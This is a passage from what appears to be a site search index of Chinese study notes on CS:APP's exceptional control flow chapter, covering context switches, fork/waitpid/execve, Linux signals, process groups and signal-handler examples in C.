\u552f\u4e00\u65b9\u6cd5\u662f\u901a\u8fc7\u5f02\u5e38\uff0c\u5f02\u5e38\u53d1\u751f\u65f6\uff0c\u63a7\u5236\u4f20\u9012\u7ed9 handler\uff0ccpu \u540c\u65f6\u8fdb\u5165 kernel mode\uff1b\u63a7\u5236\u8fd4\u56de\u5230\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0ccpu \u4e5f\u8fd4\u56de\u5230 user mode","title":"(2). \u7528\u6237\u6a21\u5f0f\u548c\u5185\u6838\u6a21\u5f0f"},{"location":"_csapp/_ECF/1/#3_1","text":"\u4e0a\u4e0b\u6587\u5207\u6362 (context switch) \u662f\u4e00\u79cd\u9ad8\u5c42\u7684 ECF\uff0c\u5efa\u7acb\u5728\u5f02\u5e38\u673a\u5236\u4e4b\u4e0a\uff0cOS \u901a\u8fc7\u6b64\u65b9\u5f0f\u5b9e\u73b0\u591a\u4efb\u52a1\u3002\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e0a\u4e0b\u6587: \u901a\u7528\u5bc4\u5b58\u5668\u3001\u6d6e\u70b9\u5bc4\u5b58\u5668\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u3001\u72b6\u6001\u5bc4\u5b58\u5668\u3001\u7528\u6237\u6808\u3001\u5185\u6838\u6808\u7b49 \u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u5982: \u9875\u8868\u3001\u8fdb\u7a0b\u8868\u3001\u6587\u4ef6\u8868 \u5185\u6838\u4e2d\u7684\u8c03\u5ea6\u5668 (scheduler) \u4ee3\u7801\u51b3\u5b9a\u62a2\u5360\u8fdb\u7a0b\u7684\u7b56\u7565\uff0c\u5f53\u524d\u8fdb\u7a0b\u88ab\u62a2\u5360\u540e\uff0c\u5c31\u4f1a\u53d1\u751f\u4e0a\u4e0b\u6587\u5207\u6362: \u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u6062\u590d\u5148\u524d\u67d0\u4e2a\u88ab\u62a2\u5360\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587 \u5c06\u63a7\u5236\u4f20\u9012\u7ed9\u65b0\u6062\u590d\u7684\u8fdb\u7a0b \u4e2d\u65ad\u548c\u7cfb\u7edf\u8c03\u7528\u90fd\u53ef\u4ee5\u5bfc\u81f4\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u4f8b\u5982: example \u8fdb\u7a0b A \u7531\u7cfb\u7edf\u8c03\u7528 read \u9677\u5165\u5230\u5185\u6838 mode\uff0c\u5185\u6838\u7684 handler \u8bf7\u6c42\u78c1\u76d8\u63a7\u5236\u5668\u7684 DMA \u4f20\u8f93 \u78c1\u76d8\u53d6\u6570\u636e\u9700\u8981\u8f83\u957f\u65f6\u95f4\uff0c\u5185\u6838\u5f88\u53ef\u80fd\u6267\u884c\u4ece A \u5230 B \u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u800c\u4e0d\u662f\u4ec0\u4e48\u4e5f\u4e0d\u505a: \u5207\u6362\u524d\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b A \u5728 kernel mode \u4e0b\u6267\u884c\u6307\u4ee4 \u5207\u6362\u540e\uff0c\u5185\u6838\u4ee3\u8868\u8fdb\u7a0b B \u5728 user mode \u4e0b\u6267\u884c\u6307\u4ee4 \u8fdb\u7a0b B \u5728 user mode \u4e0b\u8fd0\u884c\u4e86\u4e00\u4f1a\u540e\uff0c\u76f4\u5230\u78c1\u76d8\u53d1\u51fa\u4e86\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\uff0c\u8868\u793a\u6570\u636e\u5df2\u7ecf\u4ece\u78c1\u76d8\u4f20\u5230\u4e86\u5185\u5b58\uff0c\u6b64\u65f6\u5185\u6838\u53ef\u80fd\u8ba4\u4e3a B \u5df2\u7ecf\u6267\u884c\u4e86\u8db3\u591f\u957f\u7684\u65f6\u95f4\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u5230 A","title":"(3). \u4e0a\u4e0b\u6587\u5207\u6362"},{"location":"_csapp/_ECF/1/#3_2","text":"Unix \u63d0\u4f9b\u4e86\u5f88\u591a C \u7684\u64cd\u4f5c\u8fdb\u7a0b\u7684\u7cfb\u7edf\u8c03\u7528\u63a5\u53e3\u3002","title":"3. \u8fdb\u7a0b\u63a7\u5236"},{"location":"_csapp/_ECF/1/#1-id","text":"\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u552f\u4e00\u7684\u6b63\u6574\u6570 ID\uff0c getpid \u8fd4\u56de\u8c03\u7528\u8fdb\u7a0b\u7684 PID\uff0c getppid \u8fd4\u56de\u8c03\u7528\u8fdb\u7a0b\u7684\u7236\u8fdb\u7a0b\u7684 PID. #include <sys/types.h> #include <unistd.h> pid_t getpid ( void ); pid_t getppid ( void ); pid_t \u5728 Linux \u7684 types.h \u4e2d\u5b9a\u4e49\u4e3a int","title":"(1). \u83b7\u53d6\u8fdb\u7a0b ID"},{"location":"_csapp/_ECF/1/#2_3","text":"#include <sys/types.h> #include <unistd.h> pid_t fork ( void ); \u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u521b\u5efa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u6709\u4ee5\u4e0b\u7279\u6027: fork() \u5728\u5b50\u8fdb\u7a0b\u4e2d\u8fd4\u56de 0\uff0c\u5728\u7236\u8fdb\u7a0b\u4e2d\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID \u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587 \uff0c\u56e0\u6b64\u548c\u7236\u8fdb\u7a0b\u5e76\u53d1\u6267\u884c\u3001\u5730\u5740\u7a7a\u95f4\u72ec\u7acb\u3001\u5171\u4eab\u6587\u4ef6 eg int main () { pid_t pid ; int x = 1 ; pid = fork (); if ( pid == 0 ) { printf ( \"child : x=%d \\n \" , ++ x ); exit ( 0 ); } printf ( \"parent: x=%d \\n \" , -- x ); exit ( 0 ); } #include <stdlib.h> void exit ( int status ); exit \u4ee5 status \u4e3a\u9000\u51fa\u72b6\u6001\u7ec8\u6b62\u8c03\u7528\u8fdb\u7a0b\u3002","title":"(2). \u521b\u5efa\u548c\u7ec8\u6b62\u8fdb\u7a0b"},{"location":"_csapp/_ECF/1/#3_3","text":"\u8fdb\u7a0b\u7ec8\u6b62\u540e\uff0c\u9700\u8981\u663e\u5f0f\u56de\u6536 (reaped) \u4ee5\u91ca\u653e\u7cfb\u7edf\u8d44\u6e90: \u7ec8\u6b62\u4f46\u672a\u88ab\u56de\u9996\u7684\u8fdb\u7a0b\u79f0\u4e3a zombie init \u8fdb\u7a0b\u7684 PID \u4e3a 1\uff0c\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u7531\u5185\u6838\u521b\u5efa\u4e14\u4e0d\u4f1a\u7ec8\u6b62\uff0c\u662f\u6240\u6709\u8fdb\u7a0b\u7684\u7956\u5148\u3002\u5982\u679c\u4e00\u4e2a\u7236\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5185\u6838\u4f1a\u5b89\u6392 init \u8fdb\u7a0b\u6210\u4e3a\u5b83\u7684\u5b64\u513f\u8fdb\u7a0b\u7684\u517b\u7236 #include <sys/types.h> #include <sys/wait.h> pid_t waitpid ( pid_t pid , int * statusp , int options ); pid_t wait ( int * statusp ); // <==> waitpid(-1, &status, 0); pid_t pid :\u2002 \u5224\u5b9a\u7b49\u5f85\u96c6\u5408\u7684\u6210\u5458 pid > 0 :\u2002 \u7b49\u5f85\u96c6\u5408\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u5b50\u8fdb\u7a0b\uff0cPID \u4e3a pid pid = -1 :\u2002 \u7b49\u5f85\u96c6\u5408\u662f\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u5b50\u8fdb\u7a0b int options :\u2002\u4fee\u6539\u9ed8\u8ba4\u884c\u4e3a 0 :\u2002 \u9ed8\u8ba4\u884c\u4e3a\uff0c\u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u8fd4\u56de\u5b83\u7684 PID\u3002\u5982\u679c\u521a\u8c03\u7528\u65f6\u5c31\u6709\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u5c31\u7acb\u5373\u8fd4\u56de\u3002 WNOHANG :\u2002 \u5982\u679c wait set \u4e2d\u4efb\u4f55\u5b50\u8fdb\u7a0b\u90fd\u672a\u7ec8\u6b62\uff0c\u7acb\u5373\u8fd4\u56de 0 WUNTRACED :\u2002 \u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u7ec8\u6b62 / \u505c\u6b62\uff0c\u8fd4\u56de\u5176 PID WCONTINUED :\u2002 \u6302\u8d77\u8c03\u7528\u8fdb\u7a0b\uff0c\u76f4\u5230 wait set \u4e2d\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u7ec8\u6b62 \u6216 wait set \u4e2d\u4e00\u4e2a\u88ab\u505c\u6b62\u7684\u8fdb\u7a0b\u6536\u5230 SIGCONT \u7ee7\u7eed\u6267\u884c WNOHANG | WUNTRACED :\u2002 \u7acb\u5373\u8fd4\u56de\uff0cwait set \u4e2d\u6ca1\u6709\u8fdb\u7a0b\u505c\u6b62\u6216\u7ec8\u6b62\u5219\u8fd4\u56de 0\uff0c\u5426\u5219\u8fd4\u56de\u76f8\u5e94\u7684 PID int * statusp :\u2002\u5982\u679c statusp \u975e\u7a7a\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 MACRO(status) \u7684\u503c\u67e5\u770b\u9000\u51fa\u72b6\u6001 WIFEXITED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u7531 exit \u6216 return \u7ec8\u6b62\uff0c\u8fd4\u56de\u771f WEXITSTATUS :\u2002 \u8fd4\u56de\u6b63\u5e38\u7ec8\u6b62\u7684\u9000\u51fa\u503c\uff0c WIFEXITED \u4e3a\u771f\u624d\u6709\u6548 WIFSIGNALED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u7531\u4e00\u4e2a\u672a\u6355\u83b7\u7684\u4fe1\u53f7\u7ec8\u6b62\uff0c\u8fd4\u56de\u771f WTERMSIG :\u2002 \u8fd4\u56de\u5bfc\u81f4\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u7684\u4fe1\u53f7\u7684\u7f16\u53f7\uff0c WIFSIGNALED \u4e3a\u771f\u624d\u6709\u6548 WIFSTOPPED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u5f53\u524d\u662f\u505c\u6b62\u7684\uff0c\u8fd4\u56de\u771f WSTOPSIG :\u2002 \u8fd4\u56de\u5bfc\u81f4\u5b50\u8fdb\u7a0b\u505c\u6b62\u7684\u4fe1\u53f7\u7684\u7f16\u53f7\uff0c WIFSTOPPED \u4e3a\u771f\u624d\u6709\u6548 WIFCONTINUED :\u2002 \u5982\u679c\u5b50\u8fdb\u7a0b\u6536\u5230 SIGCONT \u91cd\u65b0\u542f\u52a8\uff0c\u8fd4\u56de\u771f example: \u2002 reap zombie children random.c #include \"order.h\" #define N 12 int main () { int status , i ; pid_t pid ; /* Parent creates N children */ for ( i = 0 ; i < N ; ++ i ) if (( pid = fork ()) == 0 ) exit ( 100 + i ); /* Parent reaps N children in no particular order */ while (( pid = waitpid ( -1 , & status , 0 )) > 0 ) { if ( WIFEXITED ( status )) printf ( \"child %d terminated normally with exit status=%d \\n \" , pid , WEXITSTATUS ( status )); else printf ( \"child %d terminated abnormally \\n \" , pid ); } /* The only normal termination is if there are no more children */ if ( errno != ECHILD ) fprintf ( stderr , \"waitpid error: %s \\n \" , strerror ( errno )); exit ( 0 ); } inorder.c #include \"order.h\" #define N 12 int main () { int status , i ; pid_t pid [ N ], retpid ; /* Parent creates N children */ for ( i = 0 ; i < N ; ++ i ) if (( pid [ i ] = fork ()) == 0 ) exit ( 100 + i ); /* Parent reaps N children in order */ i = 0 ; while (( retpid = waitpid ( pid [ i ++ ], & status , 0 )) > 0 ) { if ( WIFEXITED ( status )) printf ( \"child %d terminated normally with exit status=%d \\n \" , retpid , WEXITSTATUS ( status )); else printf ( \"child %d terminated abnormally \\n \" , retpid ); } /* The only normal termination is if there are no more children */ if ( errno != ECHILD ) fprintf ( stderr , \"waitpid error: %s \\n \" , strerror ( errno )); exit ( 0 ); } order.h #include <errno.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <sys/wait.h> #include <unistd.h>","title":"(3). \u56de\u6536\u5b50\u8fdb\u7a0b"},{"location":"_csapp/_ECF/1/#4","text":"#include <unistd.h> unsigned int sleep ( unsigned int secs ); int pause ( void ); sleep :\u2002 \u8bf7\u6c42\u4f11\u7720\u65f6\u95f4\u5230\u5219\u8fd4\u56de 0\uff0c\u88ab\u4fe1\u53f7\u4e2d\u65ad\u5219\u8fd4\u56de\u5269\u4f59\u79d2\u6570 pause :\u2002 \u4f11\u7720\u8c03\u7528\u8fdb\u7a0b\u76f4\u5230\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7","title":"(4). \u8fdb\u7a0b\u4f11\u7720"},{"location":"_csapp/_ECF/1/#5","text":"#include <unistd.h> int execve ( const char * filename , const char * argv [], const char * envp []); execve \u5728\u5f53\u524d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5982\u679c\u8fd0\u884c\u6210\u529f\u5219\u4e0d\u4f1a\u8fd4\u56de\u3002","title":"(5). \u52a0\u8f7d\u5e76\u8fd0\u884c\u7a0b\u5e8f"},{"location":"_csapp/_ECF/2/","text":"1. Linux \u4fe1\u53f7 \ud83e\uddd0 \u4fe1\u53f7\u662f\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u884c\u4e3a\u800c\u8a00\u5b83\u662f\u4e00\u79cd\u8f6f\u4ef6\u5f62\u5f0f\u7684\u5f02\u5e38\u3002 Linux signals (1). \u901a\u4fe1\u8fc7\u7a0b \ud83e\uddd0 \u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e24\u4e2a\u4f4d\u5411\u91cf\uff0c\u8868\u793a\u4e0e\u4e4b\u76f8\u5173\u7684\u4fe1\u53f7\u72b6\u6001 pending :\u2002 \u5f85\u5904\u7406 (\u672a\u51b3) \u7684\u4fe1\u53f7\u96c6\u5408 blocked :\u2002 \u88ab\u963b\u585e\u7684\u4fe1\u53f7\u96c6\u5408 \u5185\u6838\u901a\u8fc7\u66f4\u65b0\u8fdb\u7a0b $P$ \u7684 pending \u5411\u91cf\uff0c\u5411\u5176\u53d1\u9001\u4fe1\u53f7\u3002\u53d1\u4fe1\u53f7\u539f\u56e0\u53ef\u80fd\u51fa\u4e8e \u5185\u6838\u68c0\u6d4b\u5230\u4e00\u4e2a\u7cfb\u7edf event\uff0c\u4f8b\u5982\u9664\u96f6\u9519\u8bef \u6216 \u5b50\u8fdb\u7a0b\u7ec8\u6b62 \u5176\u4ed6\u8fdb\u7a0b\u8c03\u7528\u4e86 kill \uff0c\u663e\u5f0f\u8981\u6c42\u5185\u6838\u53d1\u9001\u4fe1\u53f7\u7ed9\u76ee\u7684\u8fdb\u7a0b \u5f53\u5185\u6838\u628a\u8fdb\u7a0b $P$ \u4ece kernel mode \u8f6c\u4e3a user mode \u65f6 (\u4ece\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de / \u5b8c\u6210\u4e0a\u4e0b\u6587\u5207\u6362)\uff0c$P$ \u8ba1\u7b97 rcv = pending & ~blocked \uff0c\u82e5\u975e\u7a7a\uff0c\u5185\u6838\u4ece\u4e2d\u9009\u53d6\u67d0\u4e2a\u4fe1\u53f7 $k$ (typically smallest) \u8ba9 $P$ \u5f3a\u5236\u63a5\u6536\uff0c\u7136\u540e\u6267\u884c\u63a5\u6536\u540e\u7684\u884c\u4e3a\uff0c\u6bcf\u79cd\u4fe1\u53f7\u90fd\u6709\u9ed8\u8ba4\u884c\u4e3a\uff0c\u662f\u4e0b\u9762\u4e4b\u4e00: \u8fdb\u7a0b\u7ec8\u6b62 \u2002 (e.g. SIGKILL ) \u8fdb\u7a0b\u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58 \u8fdb\u7a0b\u6302\u8d77\u76f4\u5230\u88ab SIGCONT \u91cd\u542f \u8fdb\u7a0b\u5ffd\u7565\u8be5\u4fe1\u53f7 \u2002 (e.g. SIGCHLD ) \u8fdb\u7a0b\u53ef\u4ee5\u66f4\u6539\u9ed8\u8ba4\u884c\u4e3a (\u6355\u83b7); \u5b8c\u6210\u63a5\u6536\u884c\u4e3a\u540e\uff0c\u5c31\u5c06\u63a7\u5236\u4f20\u56de $P$ \u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u3002 \u4efb\u4f55\u65f6\u523b\uff0c\u540c\u4e00\u7c7b\u578b\u53ea\u53ef\u80fd\u6709\u4e00\u4e2a pending \u4fe1\u53f7\uff0c\u540c\u7c7b\u578b\u7684\u5176\u4ed6\u4fe1\u53f7\u4f1a\u88ab\u4e22\u5f03\u3002 (2). \u8fdb\u7a0b\u7ec4 \ud83e\uddd0 Unix \u63d0\u4f9b\u4e86\u5f88\u591a\u53d1\u9001\u4fe1\u53f7\u7684\u673a\u5236\uff0c\u8fd9\u4e9b\u673a\u5236\u90fd\u57fa\u4e8e\u8fdb\u7a0b\u7ec4\u8fd9\u4e2a\u6982\u5ff5\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u53ea\u5c5e\u4e8e\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\uff0c\u8fdb\u7a0b\u7ec4\u7531\u4e00\u4e2a\u6b63\u6574\u6570 ID \u6807\u8bc6\u3002 #include <unistd.h> pid_t getpgrp ( void ); int setpgid ( pid_t pid , pid_t pgid ); getpgrp :\u2002 \u8fd4\u56de\u5f53\u524d\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u7ec4 ID setpgid :\u2002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b50\u8fdb\u7a0b\u548c\u5b83\u7684\u7236\u8fdb\u7a0b\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7ec4\uff0c\u6b64\u51fd\u6570\u5c06 pid \u7684\u8fdb\u7a0b\u7ec4\u53f7\u6539\u4e3a pgid pid=0 \u8868\u793a pid = \u8c03\u7528\u8fdb\u7a0b pgid=0 \u8868\u793a\u7528 pid \u6307\u5b9a\u7684\u8fdb\u7a0b\u4f5c\u4e3a\u8fdb\u7a0b\u7ec4 ID (3). Unix Shell \u673a\u5236 \ud83e\uddd0 Unix Shell \u4f7f\u7528\u4f5c\u4e1a (job) \u8fd9\u4e2a\u6982\u5ff5\u8868\u793a\u5bf9\u4e00\u6761\u547d\u4ee4\u884c\u6c42\u503c\u800c\u521b\u5efa\u7684\u8fdb\u7a0b \u4efb\u610f\u65f6\u523b\uff0c\u81f3\u591a\u6709\u4e00\u4e2a\u524d\u53f0\u4f5c\u4e1a\uff0c\u53ef\u80fd\u6709 0 / \u591a \u4e2a\u540e\u53f0\u4f5c\u4e1a\uff0c\u4f8b\u5982\uff0c $ ls | sort \u4f1a\u521b\u5efa\u7531\u4e24\u4e2a\u8fdb\u7a0b\u7ec4\u6210\u7684\u524d\u53f0\u4f5c\u4e1a \u952e\u5165 Ctrl+C \u4f1a\u5bfc\u81f4\u5185\u6838\u53d1\u9001 SIGINT \u5230\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4f1a\u7ec8\u6b62\u524d\u53f0\u8fdb\u7a0b \u952e\u5165 Ctrl+Z \u4f1a\u5bfc\u81f4\u5185\u6838\u53d1\u9001 SIGTSTP \u5230\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4f1a\u6302\u8d77\u524d\u53f0\u4f5c\u4e1a 2. \u76f8\u5173 API \ud83e\uddd0 (1). \u53d1\u9001\u4fe1\u53f7 \ud83e\uddd0 #include <sys/types.h> #include <signal.h> int kill ( pid_t pid , int sig ); pid > 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 pid pid = 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 \u8c03\u7528\u8fdb\u7a0b\u6240\u5728\u8fdb\u7a0b\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b pid < 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 \u8fdb\u7a0b\u7ec4 $|$ pid $|$ \u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b #include <unistd.h> unsigned int alarm ( unsigned int secs ); \u5b89\u6392\u5185\u6838\u5728 secs \u79d2\u540e\u53d1\u9001 SIGALRM \u7ed9\u8c03\u7528\u8fdb\u7a0b\uff0c\u5e76\u53d6\u6d88\u5f85\u5904\u7406\u7684 alarm \uff0c\u8fd4\u56de\u524d\u4e00\u6b21 alarm \u5269\u4f59\u7684\u79d2\u6570 (\u82e5\u6ca1\u6709\u8fd4\u56de 0); \u5982\u679c secs = 0 \uff0c\u4e0d\u4f1a\u5b89\u6392\u65b0\u7684 alarm . (2). \u63a5\u6536\u4fe1\u53f7 \ud83e\uddd0 \u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 signal \u51fd\u6570\u4fee\u6539\u4fe1\u53f7\u5173\u8054\u7684\u9ed8\u8ba4\u884c\u4e3a (\u9664\u4e86 SIGSTOP & SIGKILL ) #include <signal.h> typedef void ( * sighandler_t ) ( int ); sighandler_t signal ( ing signum , sighandler_t handler ); handler : SIG_IGN :\u2002 \u5ffd\u7565\u7c7b\u578b\u4e3a signum \u7684\u4fe1\u53f7 SIG_DFL :\u2002 \u4e3a\u7c7b\u578b\u4e3a signum \u7684\u4fe1\u53f7\u6062\u590d\u9ed8\u8ba4\u884c\u4e3a \u5426\u5219\uff0c handler \u6307\u5411\u4fe1\u53f7\u5904\u7406\u51fd\u6570\uff0c\u8c03\u7528\u6b64\u51fd\u6570\u88ab\u79f0\u4f5c\u6355\u83b7\u4fe1\u53f7 \u5904\u7406\u7a0b\u5e8f return \u540e\uff0c\u63a7\u5236\u8fd4\u56de\u4e3b\u7a0b\u5e8f\u88ab\u4e2d\u65ad\u7684\u4f4d\u7f6e\u3002\u6ce8\u610f\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4e5f\u53ef\u4ee5\u88ab\u4fe1\u53f7\u4e2d\u65ad\u3002 (3). \u963b\u585e\u4fe1\u53f7 \ud83e\uddd0 Linux \u6709\u4e24\u79cd\u963b\u585e\u673a\u5236: implicit:\u2002 \u5185\u6838\u9ed8\u8ba4\u963b\u585e \u5f53\u524d\u5904\u7406\u7a0b\u5e8f\u6b63\u5728\u5904\u7406\u7684\u4fe1\u53f7\u7c7b\u578b\uff0ci.e. \u5f53 handle $S$ \u6b63\u8fd0\u884c\u65f6\u82e5\u6536\u5230 $s$ \u4fe1\u53f7\uff0c pending(s) = blocked(s) = 1 explicit:\u2002 \u8c03\u7528 sigprocmask \u548c\u5b83\u7684\u8f85\u52a9\u51fd\u6570\u4eec #include <signal.h> int sigprocmask ( int how , const sigset_t * set , sigset_t * oldset ); int sigemptyset ( sigset_t * set ); int sigfillset ( sigset_t * set ); int sigaddset ( sigset_t * set , int signum ); int sigdelset ( sigset_t * set , int signum ); int sigismember ( const sigset_t * set , int signum ); sigprocmask \u7684\u884c\u4e3a\u4f9d\u8d56\u4e8e how \u7684\u503c: SIG_BLOCK :\u2002 \u628a set \u4e2d\u7684\u4fe1\u53f7\u52a0\u5230 blocked \u4e2d ( blocked = blocked | set ) SIG_UNBLOCK :\u2002 \u4ece blocked \u4e2d\u5220\u9664 set \u4e2d\u7684\u4fe1\u53f7 ( blocked = blocked & ~set ) SIG_SETMASK :\u2002 blocked = set \u5982\u679c oldset \u975e\u7a7a\uff0c blocked \u88ab\u4fee\u6539\u4e4b\u524d\u7684\u503c\u4fdd\u5b58\u5728 oldset \u4e2d\u3002 3. \u7f16\u5199\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f \ud83e\uddd0 (1). \u57fa\u672c\u539f\u5219 \ud83e\uddd0 handler \u8981\u5c3d\u53ef\u80fd\u7b80\u5355 \u5728 handler \u4e2d\u53ea\u8c03\u7528\u5f02\u6b65\u4fe1\u53f7\u5b89\u5168\u7684\u51fd\u6570 \u5f02\u6b65\u5b89\u5168: \u8981\u4e48\u8be5\u51fd\u6570\u662f\u53ef\u91cd\u5165\u7684\uff0c\u8981\u4e48\u5b83\u4e0d\u80fd\u88ab\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u65ad \u4fdd\u5b58\u548c\u6062\u590d errno \u8bb8\u591a Linux \u5f02\u6b65\u5b89\u5168\u7684\u51fd\u6570\u90fd\u4f1a\u5728\u51fa\u9519\u65f6\u8bbe\u7f6e errno \uff0c\u5728 handler \u4e2d\u8c03\u7528\u8fd9\u6837\u7684\u51fd\u6570\u53ef\u80fd\u5f71\u54cd\u4e3b\u7a0b\u5e8f\u4e2d\u4f9d\u8d56 errno \u7684\u51fd\u6570 (handler \u4e0d\u8fd4\u56de\u5219\u4e0d\u9700\u8981) \u8bbf\u95ee\u5168\u5c40\u6570\u636e\u7ed3\u6784\u65f6\uff0c\u963b\u585e\u6240\u6709\u4fe1\u53f7 \u8bbf\u95ee\u5168\u5c40\u6570\u636e\u7ed3\u6784\u7684\u6307\u4ee4\u5e8f\u5217\u4e0d\u53ef\u88ab\u4e2d\u65ad \u7528 volatile \u58f0\u660e\u5168\u5c40\u53d8\u91cf \u7f16\u8bd1\u5668\u4f18\u5316\u65f6\u53ef\u80fd\u8ba4\u4e3a\u88ab handler \u6539\u53d8\u7684\u53d8\u91cf\u6ca1\u53d1\u751f\u53d8\u5316\uff0c\u56e0\u800c\u4f7f\u7528\u7f13\u5b58\u4e2d\u7684\u503c (2). \u540c\u7c7b\u4fe1\u53f7\u4e0d\u6392\u961f \ud83e\uddd0 \u53ea\u8981\u6709\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u6216\u505c\u6b62\uff0c\u5185\u6838\u5c31\u4f1a\u53d1\u9001 SIGCHLD \u7ed9\u7236\u8fdb\u7a0b\u3002 main #include \"csapp.h\" void handler1 ( int sig ); void handler2 ( int sig ); int main () { int i , n ; char buf [ MAXBUF ]; if ( signal ( SIGCHLD , handler2 ) == SIG_ERR ) unix_error ( \"signal error\" ); for ( i = 0 ; i < 3 ; ++ i ) { if ( Fork () == 0 ) { printf ( \"Hello from child %d \\n \" , ( int ) getpid ()); exit ( 0 ); } } while ( 1 ); } handler1 void handler1 ( int sig ) { int olderrno = errno ; if ( waitpid ( -1 , NULL , 0 ) < 0 ) sio_error ( \"waitpid error\" ); Sio_puts ( \"Handler reaped child \\n \" ); Sleep ( 1 ); errno = olderrno ; } handler2 void handler2 ( int sig ) { int olderrno = errno ; while ( waitpid ( -1 , NULL , 0 ) > 0 ) { Sio_puts ( \"Handler reaped child \\n \" ); } if ( errno != ECHILD ) sio_error ( \"waitpid error\" ); Sleep ( 1 ); errno = olderrno ; } \u8be5\u7a0b\u5e8f\u7684\u76ee\u7684\u662f\u56de\u6536\u6240\u6709\u7ec8\u6b62\u7684\u5b50\u8fdb\u7a0b\u3002 handler1 :\u2002 \u53ef\u80fd\u5904\u7406\u7b2c\u4e00\u4e2a SIGCHLD \u65f6\uff0c \u540e\u4e24\u4e2a SIGCHLD \u5df2\u53d1\u9001\uff0c\u7531\u4e8e pending \u53ea\u6709\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u6700\u540e\u4e00\u4e2a SIGCHLD \u4f1a\u88ab\u4e22\u5f03 handler2 :\u2002 \u6bcf\u6536\u5230 SIGCHLD \u65f6\u53ef\u80fd\u6709\u591a\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u56e0\u800c\u5c3d\u53ef\u80fd\u5730\u56de\u6536\u662f\u6b63\u786e\u7684 \u7531\u4e8e\u540c\u7c7b\u4fe1\u53f7\u4e0d\u6392\u961f\uff0c\u56e0\u6b64\u4e0d\u80fd\u7528\u4fe1\u53f7\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u53d1\u751f\u7684\u4e8b\u4ef6\u8ba1\u6570\u3002 (3). \u540c\u6b65\u5e76\u53d1\u6d41 \ud83e\uddd0 main (with a subtle synchronized error) int main ( int argc , char ** argv ) { int pid ; sigset_t mask_all , prev_all ; Sigfillset ( & mask_all ); Signal ( SIGCHLD , handler ); initjobs (); while ( 1 ) { if (( pid = Fork ()) == 0 ) { Execve ( \"/bin/date\" , argv , NULL ); } Sigprocmask ( SIG_BLOCK , & mask_all , & prev_all ); addjob ( pid ); Sigprocmask ( SIG_SETMASK , & prev_all , NULL ); } exit ( 0 ); } handler void handler ( int sig ) { int olderrno = errno ; sigset_t mask_all , prev_all ; pid_t pid ; Sigfillset ( & mask_all ); while (( pid = waitpid ( -1 , NULL , 0 )) > 0 ) { Sigprocmask ( SIG_BLOCK , & mask_all , & prev_all ); deletejob ( pid ); 